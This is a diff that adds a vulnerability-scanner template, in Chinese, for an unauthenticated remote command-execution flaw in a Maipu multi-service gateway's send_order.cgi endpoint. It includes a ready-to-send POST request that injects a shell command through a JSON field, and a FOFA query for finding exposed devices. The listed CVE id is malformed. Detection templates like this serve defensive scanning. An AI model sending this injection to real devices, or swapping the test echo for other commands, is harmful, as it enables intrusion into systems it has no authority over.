@@ -1,0 +1,44 @@
+id: 2024-106041530
+
+info:
+  name: 迈普 多业务融合网关 send_order.cgi 前台RCE漏洞
+  author: k3ppf0r
+  severity: high
+  description: |  
+    迈普 多业务融合网关 send_order.cgi 接口处存在命令执行漏洞，未经身份验证的远程攻击者可利用此漏洞执行任意系统指令，从而获取服务器shell权限。
+  reference:
+    - https://blog.csdn.net/qq_41904294/article/details/139416608
+  remediation: |
+    打对应补丁，重启服务
+  classification:
+    cve-id: 2024-106041530
+    cvss-score: 9.8
+    cwe-id: CWE-94
+  metadata:
+    date: 2024-06-03
+    version: 迈普
+    fofa-query: title=="迈普多业务融合网关"
+  tags: RCE,rce,迈普
+
+
+http:
+  - raw:
+      - |
+        @timeout: 10s
+        POST /send_order.cgi?parameter=operation HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64MHhzZWM=; x64; rv:99.0) Gecko/20100101 Firefox/99.0
+        Content-Type: application/x-www-form-urlencoded
+        Connection: keep-alive
+        
+        {"opid":"1","name":";echo hello;","type":"rest"}
+ 
+
+    stop-at-first-match: true
+    matchers:
+      - type: dsl
+        dsl:
+          - 'contains(body,"hello")'
+          - 'status_code == 200'
+        condition: and
+
